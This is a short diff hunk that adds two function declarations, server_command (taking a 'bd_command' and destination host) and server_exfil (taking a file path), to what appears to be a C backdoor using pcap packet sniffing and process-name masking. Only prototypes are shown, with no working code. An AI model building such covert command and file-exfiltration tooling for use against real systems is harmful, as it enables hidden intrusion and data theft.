@@ -111,6 +111,8 @@ int send_tcp_datagram(struct addr_info *user_addr, char *data, int data_len);
 int send_udp_datagram(struct addr_info *user_addr, char *data, int data_len);
 void server(struct server_opt s_opt);
 void packet_handler(u_char *args, const struct pcap_pkthdr *header, const u_char *packet);
+void server_command(char *bd_command, struct sockaddr_in *dst_host);
+void server_exfil(char *file_path);
 void mask_process(char **, char *);
 void usage();
 unsigned short csum(unsigned short *, int);
